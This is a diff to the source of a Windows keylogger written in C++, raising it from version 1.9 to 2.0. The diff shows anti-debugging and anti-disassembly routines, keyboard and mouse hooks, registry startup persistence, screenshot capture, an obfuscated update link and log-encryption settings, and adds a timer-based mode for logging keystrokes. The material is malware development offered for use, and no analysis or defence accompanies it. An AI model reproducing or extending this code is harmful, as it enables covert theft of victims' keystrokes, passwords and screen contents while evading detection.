@@ -16,7 +16,6 @@
 #include <iterator>
 #include <memory>
 #include <set>
-#include <vector>
 #include <comdef.h>
 #include <comutil.h>
 #include <Shldisp.h>
@@ -35,7 +34,7 @@
 
 #include "Antidbg.h"
 #include "log.h"
-#include "lz4\lz4.h"
+//#include "lz4\lz4.h"
 #include "base64.h"
 
 using buffer = std::vector<char>;
@@ -47,13 +46,15 @@ using buffer = std::vector<char>;
 
 //[ VERSION INFO ]
 #define IsMajor true        //let the program know whether its a Dev build or not
-#define CurrentVersion "1.9"//current version number
+#define CurrentVersion "2.0"//current version number
 #define GitVersionLink "i\\wnoNw;Yc|LZ\\YvYcpHYVx6Ycj34N6XI\\wn2crfY[P;{cu;ofvSZ[{L4Nv;4[wSpdnTpdxPoenPZfkXJc2n4\\weZ[{;{N8OJe2TJc"//link to GitHub Raw server containing up-to-date version file
 
 //[ LOGS ]
-#define CryptLogs true      //whether or not to crypt files
+#define CryptLogs false     //whether or not to crypt files
 #define KeyShiftLimit 122   //cap for the highest possible random encryption key
-#define CharactersPerLog 400//how many characters should be in a log
+#define LogMode 2           //how to log keystrokes                          [ 1 = Timer  ,  2 = Characters-per-log ]
+#define LogTimer 15         //minutes per log                                [ must use mode 2 ]
+#define CharactersPerLog 400//how many characters should be in a log         [ must use mode 1 ]
 #define QuitIfUntrust true  //should we send a log if the environment is untrusted or quit on the spot?
 
 //[ SCREENGRABBING ]
@@ -101,15 +102,16 @@ using buffer = std::vector<char>;
 //#pragma comment(lib, "Wbemuuid.lib.")
 #pragma comment(lib, "urlmon.lib")
 #pragma comment(lib, "Netapi32.lib")
+#pragma comment(lib, "shlwapi.lib")
 
 #define _WIN32_WINNT 0x050
 
 extern "C" int RandomGenerator();
 extern "C" void __AsmImpossibleDisassm();
 extern "C" void __AsmJmpSameTarget();
-int SilentlyRemoveDirectory(const char* dir);
+void DeleteDirectory(std::string dir);
 int CalculateDirSize(std::string DirectoryToCheck);
-BOOL RegisterMyProgramForStartup(PCSTR pszAppName, PCSTR pathToExe, PCSTR args);
+void CreateRegistryKey(PCSTR AppName, PCSTR PathToExe);
 ULONG WINAPI Protect(LPVOID);
 std::string GetCpuInfo();
 BOOL SaveHBITMAPToFile(HBITMAP hBitmap, LPCTSTR lpszFileName);
@@ -122,7 +124,7 @@ LRESULT CALLBACK KeyboardThread(int nCode, WPARAM wParam, LPARAM lParam);
 LRESULT CALLBACK MouseThread(_In_ int nCode, _In_ WPARAM wParam, _In_ LPARAM lParam);
 std::string HardDecode(std::string EncodedString);
 int Hooker(int HookType, HOOKPROC CallbackFunc);
-
+void TimerThread();
 
 
 typedef std::string String;
